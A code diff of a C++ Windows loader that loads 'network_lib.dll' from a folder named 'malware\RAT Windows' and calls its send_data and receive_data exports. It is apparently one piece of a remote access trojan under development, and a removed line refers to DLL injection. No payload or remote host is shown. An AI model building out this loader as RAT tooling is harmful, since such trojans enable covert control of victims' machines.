@@ -1,24 +1,22 @@
+// cl /EHsc dll_loader.cpp /link /OUT:dll_loader.exe
 #include <windows.h>
 #include <iostream>
 #include <string>
-#include <thread>
-#include <tlhelp32.h>
-#include <tchar.h>
+#include <tlhelp32.h>                                                       //for getprocess id
 
 using namespace std;
 
-// Define the function pointer type
-typedef void (*SendDataFunc)(const std::string&, const std::string&);
-// Define the function pointer type
-typedef string (*RecvDataFunc)(SOCKET&, const std::string&, const std::string&);
-typedef void (*sayHiFunc)(const std::string&);
+typedef int (*SendDataFunc)(const std::string&, const std::string&);
+typedef string (*RecvDataFunc)(const std::string&);
 
-// Get the DLL file name from the command-line argument
+SendDataFunc send_data;
+RecvDataFunc receive_data;
+
 //LPSTR dll_file = argv[1];
 //LPCSTR dll_file = "test_lib.dll";                                                      //!!!!!!!!!!!!!!!NOte the datatype!!!!!!!!!!!!!!!!!!!
 LPCSTR dllPath = "C:\\malware\\RAT Windows\\test\\func\\dll\\network_lib.dll";
 DWORD pid;
-
+HINSTANCE hDLL;
 
 BOOL ListRunningProcesses()
 {
@@ -72,57 +70,33 @@ BOOL ListRunningProcesses()
 
 }
 
-void load_dll()
+int load_dll()
 {
-    HINSTANCE hDLL = LoadLibraryA(dllPath);
+    hDLL = LoadLibraryA(dllPath);
     if (hDLL == NULL)
     {
         printf("Failed to load DLL: %d\n", GetLastError());
+        return 1;
         //return EXIT_FAILURE;
     }
-    printf("\n\nDLL loaded successfully!\n\n");
 
-    // Get the address of the exported function
-    SendDataFunc send_data = (SendDataFunc)GetProcAddress(hDLL, "?send_data@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");
+    send_data = (SendDataFunc)GetProcAddress(hDLL, "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");
     if (!send_data)
     {
         printf("Failed to get function address: %d\n", GetLastError());
         FreeLibrary(hDLL);
-        return;
+        return 1;
     }
-    printf("Function 'send_data' retrieved successfully!\n");
 
-    // Get the address of the exported function
-    RecvDataFunc receive_data = (RecvDataFunc)GetProcAddress(hDLL, "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEA_KAEBV12@@Z");
+    receive_data = (RecvDataFunc)GetProcAddress(hDLL, "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");
     if (!receive_data)
     {
         printf("Failed to get function address: %d\n", GetLastError());
         FreeLibrary(hDLL);
-        return;
+        return 1;
     }
-    printf("Function 'receive_data' retrieved successfully!\n"); 
 
-    
-    // sayHiFunc sayhi = (sayHiFunc)GetProcAddress(hDLL, "?sayhi@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z");
-    // if (!sayhi)
-    // {
-    //     printf("Failed to get function address: %d\n", GetLastError());
-    //     FreeLibrary(hDLL);
-    //     return;
-    // }
-    // printf("Function 'sayhi' retrieved successfully!\n");
-
-    // string test;
-    // cin >> test;
-    // sayhi(test);
-
-    send_data("12345678910.txt","data");
-
-
-    FreeLibrary(hDLL);
-    printf("\n library freed\n\n"); 
-    return;
-       
+    return 0;
 }
 
 int main(int argc, char* argv[])
@@ -130,8 +104,12 @@ int main(int argc, char* argv[])
 
     load_dll();
 
+    if(!send_data("12345678910.txt","data")) cout <<"Error !send data"<<endl;
+    cout <<"\n"<< receive_data("12345678910.txt");
+
+
+    if(!FreeLibrary(hDLL))printf("\n library !freed\n\n");
     //ListRunningProcesses();
-    //InjectDll(pid, dllPath);
 
     return 0;
 }
